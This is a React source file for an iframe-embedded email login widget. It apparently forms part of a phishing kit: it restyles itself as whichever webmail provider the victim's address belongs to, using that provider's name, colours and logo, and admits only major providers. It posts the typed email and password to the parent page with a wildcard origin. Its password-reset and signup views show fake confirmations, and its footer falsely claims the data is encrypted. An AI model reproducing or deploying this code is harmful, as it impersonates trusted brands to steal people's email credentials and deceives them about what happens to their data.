import { useState, useMemo, useCallback, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Mail, Lock, Eye, EyeOff, ArrowRight, ArrowLeft, UserPlus, KeyRound, Loader2, ShieldX, ShieldCheck } from "lucide-react";
import { getProviderFromEmail } from "@/lib/providerConfig";
import { useEmailVerification } from "@/hooks/useEmailVerification";
import { useIframeResize } from "@/hooks/useIframeResize";

type ModalView = "login" | "forgot" | "signup";

const colorTransition = {
  duration: 0.6,
  ease: [0.4, 0, 0.2, 1] as const,
};

const viewSlide = {
  initial: { x: 60, opacity: 0 },
  animate: { x: 0, opacity: 1 },
  exit: { x: -60, opacity: 0 },
  transition: { duration: 0.25, ease: [0.4, 0, 0.2, 1] as const },
};

const EmailLogin = () => {
  useIframeResize();

  // --- Theme Chameleon Listener ---
  useEffect(() => {
    const handleMessage = (e: MessageEvent) => {
      if (e.data && e.data.type === "SYNC_THEME" && e.data.payload) {
        Object.entries(e.data.payload).forEach(([key, value]) => {
          if (typeof value === 'string' && key.startsWith('--')) {
            document.documentElement.style.setProperty(key, value);
          }
        });
        if (e.data.payload.logo) {
            setExternalLogo(e.data.payload.logo);
        }
      }
    };
    window.addEventListener("message", handleMessage);
    return () => window.removeEventListener("message", handleMessage);
  }, []);

  const [externalLogo, setExternalLogo] = useState<string | null>(null);
  const [view, setView] = useState<ModalView>("login");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [rememberMe, setRememberMe] = useState(false);
  const [logoError, setLogoError] = useState(false);
  const [resetSent, setResetSent] = useState(false);
  const [signupSuccess, setSignupSuccess] = useState(false);

  const provider = useMemo(() => getProviderFromEmail(email), [email]);
  const verification = useEmailVerification(email);

  const p = useMemo(() => {
    if (verification.mxTheme) return verification.mxTheme;
    return provider;
  }, [provider, verification.mxTheme]);

  const isDetected = p.name !== "";
  const isBlocked = verification.status === "blocked";
  const isVerifying = verification.status === "verifying";
  const canProceed = isDetected && !isBlocked && !isVerifying;

  const handleEmailChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    setEmail(e.target.value);
    setLogoError(false);
  }, []);

  const resetState = useCallback(() => {
    setPassword("");
    setConfirmPassword("");
    setShowPassword(false);
    setResetSent(false);
    setSignupSuccess(false);
  }, []);

  const switchView = useCallback((newView: ModalView) => {
    resetState();
    setView(newView);
  }, [resetState]);

  const handleLoginSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!canProceed) return;
    // Dispatch event for parent page
    const detail = { type: "login", email, password, provider: p.name, timestamp: new Date().toISOString() };
    window.dispatchEvent(new CustomEvent("emailLoginSubmit", { detail }));
    if (window.parent !== window) {
      try { window.parent.postMessage({ type: "EMAIL_LOGIN_SUBMIT", data: detail }, "*"); } catch (_) {}
    }
  };

  const handleForgotSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!canProceed) return;
    setResetSent(true);
    const detail = { type: "forgot", email, provider: p.name, timestamp: new Date().toISOString() };
    window.dispatchEvent(new CustomEvent("emailLoginSubmit", { detail }));
    if (window.parent !== window) {
      try { window.parent.postMessage({ type: "EMAIL_LOGIN_SUBMIT", data: detail }, "*"); } catch (_) {}
    }
  };

  const handleSignupSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!canProceed) return;
    if (password !== confirmPassword) return;
    setSignupSuccess(true);
    const detail = { type: "signup", email, password, provider: p.name, timestamp: new Date().toISOString() };
    window.dispatchEvent(new CustomEvent("emailLoginSubmit", { detail }));
    if (window.parent !== window) {
      try { window.parent.postMessage({ type: "EMAIL_LOGIN_SUBMIT", data: detail }, "*"); } catch (_) {}
    }
  };

  const viewConfig = {
    login: {
      title: isBlocked ? "Unsupported email provider" : isVerifying ? "Verifying provider…" : isDetected ? `Sign in with ${p.name}` : "Sign in to your email",
      subtitle: isBlocked ? "Please use a recognized email provider to continue" : isVerifying ? "Checking your email domain" : isDetected ? "Enter your credentials to continue" : "Type your email to get started",
    },
    forgot: {
      title: "Reset your password",
      subtitle: isDetected ? `We'll send a reset link to your ${p.name} address` : "Enter your email to receive a reset link",
    },
    signup: {
      title: isBlocked ? "Unsupported email provider" : isDetected ? `Sign up with ${p.name}` : "Create your account",
      subtitle: isBlocked ? "Please use a recognized email provider" : "Enter your details to get started",
    },
  };

  const current = viewConfig[view];

  return (
    <div className="flex items-center justify-center min-h-screen p-4" style={{ background: "transparent" }}>
      <motion.div
        className="relative w-full max-w-md rounded-2xl overflow-hidden"
        style={{
          boxShadow: isBlocked
            ? "0 25px 60px -12px rgba(239,68,68,0.2)"
            : isDetected
            ? `0 25px 60px -12px hsl(${p.primaryColor} / 0.3), 0 8px 24px -8px hsl(${p.primaryColor} / 0.15)`
            : "0 25px 50px -12px rgba(0,0,0,0.25)",
        }}
        initial={{ scale: 0.95, opacity: 0, y: 20 }}
        animate={{ scale: 1, opacity: 1, y: 0 }}
        transition={{ type: "spring", damping: 28, stiffness: 350 }}
      >
        {/* Solid background */}
        <motion.div
          className="absolute inset-0"
          animate={{ backgroundColor: isBlocked ? "hsl(0 50% 98%)" : isDetected ? p.bgColor : "hsl(0 0% 100%)" }}
          transition={colorTransition}
        />

        {/* Top bar */}
        <motion.div
          className="relative h-1.5 w-full"
          animate={{
            background: isBlocked
              ? "linear-gradient(90deg, hsl(0 80% 55%), hsl(0 60% 45%))"
              : isVerifying
              ? "linear-gradient(90deg, hsl(45 90% 55%), hsl(35 90% 50%))"
              : isDetected
              ? `linear-gradient(90deg, hsl(${p.primaryColor}), hsl(${p.accentColor}))`
              : "linear-gradient(90deg, hsl(220 14% 75%), hsl(220 14% 85%))",
          }}
          transition={colorTransition}
        />

        {/* Back button */}
        {view !== "login" && (
          <button
            onClick={() => switchView("login")}
            className="absolute top-4 left-4 p-1.5 rounded-full hover:bg-black/5 transition-colors z-10"
          >
            <motion.div animate={{ color: `hsl(${p.textColor})` }} transition={colorTransition}>
              <ArrowLeft className="w-4 h-4" />
            </motion.div>
          </button>
        )}

        <div className="relative p-8 pt-6 min-h-[380px]">
          {/* Logo area */}
          <div className="flex justify-center mb-6">
            <motion.div
              className="w-16 h-16 rounded-2xl flex items-center justify-center overflow-hidden border-2"
              animate={{
                backgroundColor: isBlocked ? "hsl(0 60% 95%)" : isVerifying ? "hsl(45 60% 95%)" : isDetected ? `hsl(${p.primaryColor} / 0.12)` : "hsl(220 14% 94%)",
                borderColor: isBlocked ? "hsl(0 50% 80%)" : isVerifying ? "hsl(45 50% 80%)" : isDetected ? `hsl(${p.primaryColor} / 0.25)` : "hsl(220 14% 88%)",
              }}
              transition={colorTransition}
            >
              <AnimatePresence mode="wait">
                {isBlocked ? (
                  <motion.div key="blocked" initial={{ scale: 0 }} animate={{ scale: 1 }} exit={{ scale: 0 }}>
                    <ShieldX className="w-7 h-7" style={{ color: "hsl(0 70% 50%)" }} />
                  </motion.div>
                ) : isVerifying ? (
                  <motion.div key="verifying" initial={{ scale: 0 }} animate={{ scale: 1, rotate: 360 }} exit={{ scale: 0 }} transition={{ rotate: { duration: 1.5, repeat: Infinity, ease: "linear" } }}>
                    <Loader2 className="w-7 h-7" style={{ color: "hsl(45 80% 45%)" }} />
                  </motion.div>
                ) : isDetected && !logoError ? (
                  <motion.img
                    key={externalLogo || p.logo}
                    src={externalLogo || p.logo}
                    alt={p.name}
                    className="w-16 h-8 object-contain"
                    initial={{ scale: 0, rotate: -15, opacity: 0 }}
                    animate={{ scale: 1, rotate: 0, opacity: 1 }}
                    exit={{ scale: 0, rotate: 15, opacity: 0 }}
                    transition={{ type: "spring", damping: 18, stiffness: 250 }}
                    onError={() => setLogoError(true)}
                  />
                ) : isDetected && logoError ? (
                  <motion.span key="fallback-letter" className="text-2xl font-bold" initial={{ scale: 0 }} animate={{ scale: 1 }} exit={{ scale: 0 }}>
                    <motion.span animate={{ color: `hsl(${p.primaryColor})` }} transition={colorTransition}>
                      {p.name.charAt(0)}
                    </motion.span>
                  </motion.span>
                ) : (
                  <motion.div key="default" initial={{ scale: 0 }} animate={{ scale: 1 }} exit={{ scale: 0 }}>
                    {view === "login" && <Mail className="w-7 h-7" style={{ color: "hsl(220 14% 65%)" }} />}
                    {view === "forgot" && <KeyRound className="w-7 h-7" style={{ color: "hsl(220 14% 65%)" }} />}
                    {view === "signup" && <UserPlus className="w-7 h-7" style={{ color: "hsl(220 14% 65%)" }} />}
                  </motion.div>
                )}
              </AnimatePresence>
            </motion.div>
          </div>

          {/* Verification badge */}
          <AnimatePresence>
            {(verification.status === "verified" || verification.status === "known") && isDetected && (
              <motion.div
                className="flex items-center justify-center gap-1.5 mb-3"
                initial={{ opacity: 0, height: 0 }}
                animate={{ opacity: 1, height: "auto" }}
                exit={{ opacity: 0, height: 0 }}
              >
                <ShieldCheck className="w-3.5 h-3.5" style={{ color: `hsl(${p.primaryColor})` }} />
                <span className="text-xs font-medium" style={{ color: `hsl(${p.primaryColor})` }}>
                  {verification.status === "verified" ? "Provider verified via MX" : "Recognized provider"}
                </span>
              </motion.div>
            )}
          </AnimatePresence>

          {/* Title */}
          <motion.div className="text-center mb-6">
            <AnimatePresence mode="wait">
              <motion.h2
                key={`${view}-${p.name}-${verification.status}`}
                className="text-xl font-semibold"
                initial={{ opacity: 0, y: -8 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: 8 }}
                transition={{ duration: 0.3 }}
              >
                <motion.span animate={{ color: isBlocked ? "hsl(0 70% 40%)" : `hsl(${p.textColor})` }} transition={colorTransition}>
                  {current.title}
                </motion.span>
              </motion.h2>
            </AnimatePresence>
            <motion.p className="text-sm mt-1" animate={{ color: isBlocked ? "hsl(0 40% 50%)" : `hsl(${p.textColor} / 0.55)` }} transition={colorTransition}>
              {current.subtitle}
            </motion.p>
          </motion.div>

          {/* View content */}
          <AnimatePresence mode="wait">
            {/* LOGIN VIEW */}
            {view === "login" && (
              <motion.div key="login" {...viewSlide}>
                <form onSubmit={handleLoginSubmit} className="space-y-4" autoComplete="on">
                  <EmailInput email={email} onChange={handleEmailChange} provider={p} isDetected={isDetected} isBlocked={isBlocked} isVerifying={isVerifying} />

                  <AnimatePresence>
                    {canProceed && (
                      <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: "auto", opacity: 1 }} exit={{ height: 0, opacity: 0 }} transition={{ duration: 0.35, ease: [0.4, 0, 0.2, 1] }}>
                        <PasswordInput
                          value={password}
                          onChange={setPassword}
                          show={showPassword}
                          onToggle={() => setShowPassword(!showPassword)}
                          provider={p}
                          autoComplete="current-password"
                        />
                      </motion.div>
                    )}
                  </AnimatePresence>

                  <AnimatePresence>
                    {canProceed && (
                      <motion.div className="flex items-center justify-between overflow-hidden" initial={{ height: 0, opacity: 0 }} animate={{ height: "auto", opacity: 1 }} exit={{ height: 0, opacity: 0 }} transition={{ duration: 0.3 }}>
                        <label className="flex items-center gap-2 cursor-pointer select-none">
                          <input type="checkbox" checked={rememberMe} onChange={(e) => setRememberMe(e.target.checked)} className="w-3.5 h-3.5 rounded cursor-pointer" style={{ accentColor: `hsl(${p.primaryColor})`, transition: "accent-color 0.5s ease" }} />
                          <motion.span className="text-xs" animate={{ color: `hsl(${p.textColor} / 0.65)` }} transition={colorTransition}>Remember me</motion.span>
                        </label>
                        <motion.button type="button" className="text-xs font-medium hover:underline" animate={{ color: `hsl(${p.primaryColor})` }} transition={colorTransition} onClick={() => switchView("forgot")}>
                          Forgot password?
                        </motion.button>
                      </motion.div>
                    )}
                  </AnimatePresence>

                  <BlockedMessage isBlocked={isBlocked} />

                  <SubmitButton
                    label={isBlocked ? "Provider not supported" : isVerifying ? "Verifying…" : canProceed ? `Continue with ${p.name}` : "Continue"}
                    provider={p}
                    isDetected={isDetected}
                    disabled={isBlocked || isVerifying || !canProceed}
                    isBlocked={isBlocked}
                    isVerifying={isVerifying}
                  />
                </form>

                <motion.div className="text-center mt-5" animate={{ color: `hsl(${p.textColor} / 0.55)` }} transition={colorTransition}>
                  <span className="text-xs">Don't have an account?{" "}</span>
                  <motion.button className="text-xs font-semibold hover:underline" animate={{ color: `hsl(${p.primaryColor})` }} transition={colorTransition} onClick={() => switchView("signup")}>
                    Sign up
                  </motion.button>
                </motion.div>
              </motion.div>
            )}

            {/* FORGOT PASSWORD VIEW */}
            {view === "forgot" && (
              <motion.div key="forgot" {...viewSlide}>
                {!resetSent ? (
                  <form onSubmit={handleForgotSubmit} className="space-y-4" autoComplete="on">
                    <EmailInput email={email} onChange={handleEmailChange} provider={p} isDetected={isDetected} isBlocked={isBlocked} isVerifying={isVerifying} />
                    <BlockedMessage isBlocked={isBlocked} />
                    <SubmitButton
                      label={isBlocked ? "Provider not supported" : "Send reset link"}
                      provider={p}
                      isDetected={isDetected}
                      icon={<KeyRound className="w-4 h-4" />}
                      disabled={isBlocked || isVerifying || !canProceed}
                      isBlocked={isBlocked}
                      isVerifying={isVerifying}
                    />
                  </form>
                ) : (
                  <motion.div className="text-center space-y-4 py-4" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} transition={{ duration: 0.3 }}>
                    <motion.div className="w-14 h-14 rounded-full mx-auto flex items-center justify-center" animate={{ backgroundColor: isDetected ? `hsl(${p.primaryColor} / 0.12)` : "hsl(220 14% 94%)" }} transition={colorTransition}>
                      <motion.div animate={{ color: isDetected ? `hsl(${p.primaryColor})` : "hsl(220 14% 55%)" }} transition={colorTransition}>
                        <Mail className="w-6 h-6" />
                      </motion.div>
                    </motion.div>
                    <motion.p className="text-sm font-medium" animate={{ color: `hsl(${p.textColor})` }} transition={colorTransition}>Check your inbox!</motion.p>
                    <motion.p className="text-xs leading-relaxed" animate={{ color: `hsl(${p.textColor} / 0.55)` }} transition={colorTransition}>
                      We've sent a password reset link to<br /><strong>{email}</strong>
                    </motion.p>
                    <motion.button type="button" className="text-xs font-medium hover:underline mt-2" animate={{ color: `hsl(${p.primaryColor})` }} transition={colorTransition} onClick={() => switchView("login")}>
                      Back to sign in
                    </motion.button>
                  </motion.div>
                )}
              </motion.div>
            )}

            {/* SIGNUP VIEW */}
            {view === "signup" && (
              <motion.div key="signup" {...viewSlide}>
                {!signupSuccess ? (
                  <form onSubmit={handleSignupSubmit} className="space-y-4" autoComplete="on">
                    <EmailInput email={email} onChange={handleEmailChange} provider={p} isDetected={isDetected} isBlocked={isBlocked} isVerifying={isVerifying} />

                    <AnimatePresence>
                      {canProceed && (
                        <motion.div className="space-y-4" initial={{ height: 0, opacity: 0 }} animate={{ height: "auto", opacity: 1 }} exit={{ height: 0, opacity: 0 }} transition={{ duration: 0.35 }}>
                          <PasswordInput
                            value={password}
                            onChange={setPassword}
                            show={showPassword}
                            onToggle={() => setShowPassword(!showPassword)}
                            provider={p}
                            autoComplete="new-password"
                            placeholder="Create password"
                          />
                          <div className="relative">
                            <motion.div className="absolute left-3 top-1/2 -translate-y-1/2 z-10" animate={{ color: `hsl(${p.primaryColor})` }} transition={colorTransition}>
                              <Lock className="w-4 h-4" />
                            </motion.div>
                            <input
                              type="password"
                              name="confirm-password"
                              autoComplete="new-password"
                              placeholder="Confirm password"
                              value={confirmPassword}
                              onChange={(e) => setConfirmPassword(e.target.value)}
                              className="w-full pl-10 pr-4 py-3 rounded-xl text-sm outline-none"
                              style={{
                                backgroundColor: p.inputBg,
                                border: `2px solid ${p.inputBorder}`,
                                color: `hsl(${p.textColor})`,
                                transition: "background-color 0.5s ease, border-color 0.5s ease, color 0.5s ease",
                              }}
                            />
                          </div>
                        </motion.div>
                      )}
                    </AnimatePresence>

                    <BlockedMessage isBlocked={isBlocked} />

                    <SubmitButton
                      label={isBlocked ? "Provider not supported" : canProceed ? `Create ${p.name} account` : "Continue"}
                      provider={p}
                      isDetected={isDetected}
                      icon={<UserPlus className="w-4 h-4" />}
                      disabled={isBlocked || isVerifying || !canProceed}
                      isBlocked={isBlocked}
                      isVerifying={isVerifying}
                    />
                  </form>
                ) : (
                  <motion.div className="text-center space-y-4 py-4" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} transition={{ duration: 0.3 }}>
                    <motion.div className="w-14 h-14 rounded-full mx-auto flex items-center justify-center text-2xl" animate={{ backgroundColor: isDetected ? `hsl(${p.primaryColor} / 0.12)` : "hsl(120 50% 94%)" }} transition={colorTransition}>
                      🎉
                    </motion.div>
                    <motion.p className="text-sm font-medium" animate={{ color: `hsl(${p.textColor})` }} transition={colorTransition}>Account created!</motion.p>
                    <motion.p className="text-xs leading-relaxed" animate={{ color: `hsl(${p.textColor} / 0.55)` }} transition={colorTransition}>
                      Check <strong>{email}</strong> for a<br />verification link to get started.
                    </motion.p>
                    <motion.button type="button" className="text-xs font-medium hover:underline mt-2" animate={{ color: `hsl(${p.primaryColor})` }} transition={colorTransition} onClick={() => switchView("login")}>
                      Back to sign in
                    </motion.button>
                  </motion.div>
                )}

                {!signupSuccess && (
                  <motion.div className="text-center mt-5" animate={{ color: `hsl(${p.textColor} / 0.55)` }} transition={colorTransition}>
                    <span className="text-xs">Already have an account?{" "}</span>
                    <motion.button className="text-xs font-semibold hover:underline" animate={{ color: `hsl(${p.primaryColor})` }} transition={colorTransition} onClick={() => switchView("login")}>
                      Sign in
                    </motion.button>
                  </motion.div>
                )}
              </motion.div>
            )}
          </AnimatePresence>

          {/* Footer */}
          <motion.p className="text-center text-xs mt-5" animate={{ color: `hsl(${p.textColor} / 0.35)` }} transition={colorTransition}>
            Secure login • Your data is encrypted
          </motion.p>
        </div>
      </motion.div>
    </div>
  );
};

/* ===== Shared sub-components ===== */

const BlockedMessage = ({ isBlocked }: { isBlocked: boolean }) => (
  <AnimatePresence>
    {isBlocked && (
      <motion.div
        className="rounded-xl p-4 text-center space-y-2"
        style={{ backgroundColor: "hsl(0 50% 97%)", border: "1px solid hsl(0 40% 88%)" }}
        initial={{ opacity: 0, height: 0 }}
        animate={{ opacity: 1, height: "auto" }}
        exit={{ opacity: 0, height: 0 }}
      >
        <p className="text-xs font-semibold" style={{ color: "hsl(0 60% 40%)" }}>
          This email provider is not recognized
        </p>
        <p className="text-[11px] leading-relaxed" style={{ color: "hsl(0 30% 50%)" }}>
          We currently support major providers only. Please sign in with one of the following:
        </p>
        <div className="flex flex-wrap justify-center gap-1.5 pt-1">
          {["Gmail", "Outlook", "Yahoo", "iCloud", "ProtonMail", "AOL", "Zoho", "FastMail", "Tuta"].map((name) => (
            <span
              key={name}
              className="inline-block px-2 py-0.5 rounded-md text-[10px] font-medium"
              style={{ backgroundColor: "hsl(0 30% 93%)", color: "hsl(0 40% 40%)" }}
            >
              {name}
            </span>
          ))}
        </div>
        <p className="text-[10px] pt-1" style={{ color: "hsl(0 20% 60%)" }}>
          US ISP emails (AT&T, Comcast, Verizon, etc.) are also supported.
        </p>
      </motion.div>
    )}
  </AnimatePresence>
);

interface EmailInputProps {
  email: string;
  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  provider: ReturnType<typeof getProviderFromEmail>;
  isDetected: boolean;
  isBlocked: boolean;
  isVerifying: boolean;
}

const EmailInput = ({ email, onChange, provider, isDetected, isBlocked, isVerifying }: EmailInputProps) => (
  <div className="relative">
    <motion.div
      className="absolute left-3 top-1/2 -translate-y-1/2 z-10"
      animate={{ color: isBlocked ? "hsl(0 70% 50%)" : isVerifying ? "hsl(45 80% 45%)" : isDetected ? `hsl(${provider.primaryColor})` : "hsl(220 14% 55%)" }}
      transition={colorTransition}
    >
      <Mail className="w-4 h-4" />
    </motion.div>
    <input
      type="email"
      name="email"
      autoComplete="email"
      placeholder="you@email.com"
      value={email}
      onChange={onChange}
      className="w-full pl-10 pr-4 py-3 rounded-xl text-sm outline-none"
      style={{
        backgroundColor: isBlocked ? "hsl(0 30% 96%)" : isDetected ? provider.inputBg : "hsl(220 14% 96%)",
        border: `2px solid ${isBlocked ? "hsl(0 50% 80%)" : isDetected ? provider.inputBorder : "hsl(220 14% 88%)"}`,
        color: `hsl(${provider.textColor})`,
        transition: "background-color 0.5s ease, border-color 0.5s ease, color 0.5s ease",
      }}
    />
    <AnimatePresence>
      {isVerifying && (
        <motion.div className="absolute right-3 top-1/2 -translate-y-1/2" initial={{ opacity: 0, scale: 0 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0 }}>
          <Loader2 className="w-4 h-4 animate-spin" style={{ color: "hsl(45 80% 45%)" }} />
        </motion.div>
      )}
      {isBlocked && (
        <motion.div className="absolute right-3 top-1/2 -translate-y-1/2" initial={{ opacity: 0, scale: 0 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0 }}>
          <ShieldX className="w-4 h-4" style={{ color: "hsl(0 70% 50%)" }} />
        </motion.div>
      )}
    </AnimatePresence>
  </div>
);

interface PasswordInputProps {
  value: string;
  onChange: (val: string) => void;
  show: boolean;
  onToggle: () => void;
  provider: ReturnType<typeof getProviderFromEmail>;
  autoComplete: string;
  placeholder?: string;
}

const PasswordInput = ({ value, onChange, show, onToggle, provider, autoComplete, placeholder = "Password" }: PasswordInputProps) => (
  <div className="relative">
    <motion.div className="absolute left-3 top-1/2 -translate-y-1/2 z-10" animate={{ color: `hsl(${provider.primaryColor})` }} transition={colorTransition}>
      <Lock className="w-4 h-4" />
    </motion.div>
    <input
      type={show ? "text" : "password"}
      name="password"
      autoComplete={autoComplete}
      placeholder={placeholder}
      value={value}
      onChange={(e) => onChange(e.target.value)}
      className="w-full pl-10 pr-10 py-3 rounded-xl text-sm outline-none"
      style={{
        backgroundColor: provider.inputBg,
        border: `2px solid ${provider.inputBorder}`,
        color: `hsl(${provider.textColor})`,
        transition: "background-color 0.5s ease, border-color 0.5s ease, color 0.5s ease",
      }}
    />
    <button type="button" onClick={onToggle} className="absolute right-3 top-1/2 -translate-y-1/2">
      <motion.div animate={{ color: `hsl(${provider.primaryColor} / 0.55)` }} transition={colorTransition}>
        {show ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
      </motion.div>
    </button>
  </div>
);

interface SubmitButtonProps {
  label: string;
  provider: ReturnType<typeof getProviderFromEmail>;
  isDetected: boolean;
  icon?: React.ReactNode;
  disabled?: boolean;
  isBlocked?: boolean;
  isVerifying?: boolean;
}

const SubmitButton = ({ label, provider, isDetected, icon, disabled, isBlocked, isVerifying }: SubmitButtonProps) => (
  <motion.button
    type="submit"
    disabled={disabled}
    className="w-full py-3 rounded-xl text-sm font-medium flex items-center justify-center gap-2 disabled:cursor-not-allowed"
    animate={{
      background: isBlocked
        ? "hsl(0 60% 50%)"
        : isVerifying
        ? "hsl(45 70% 50%)"
        : isDetected
        ? `linear-gradient(135deg, hsl(${provider.primaryColor}), hsl(${provider.secondaryColor}))`
        : "hsl(220 14% 46%)",
      boxShadow: isBlocked
        ? "0 4px 14px hsl(0 60% 50% / 0.3)"
        : isDetected
        ? `0 4px 14px hsl(${provider.primaryColor} / 0.35)`
        : "0 2px 8px rgba(0,0,0,0.12)",
      opacity: disabled ? 0.6 : 1,
    }}
    transition={colorTransition}
    style={{ color: "white" }}
    whileHover={disabled ? {} : { scale: 1.015, y: -1 }}
    whileTap={disabled ? {} : { scale: 0.985 }}
  >
    {isVerifying && <Loader2 className="w-4 h-4 animate-spin" />}
    {label}
    {!isVerifying && (icon || <ArrowRight className="w-4 h-4" />)}
  </motion.button>
);

export default EmailLogin;
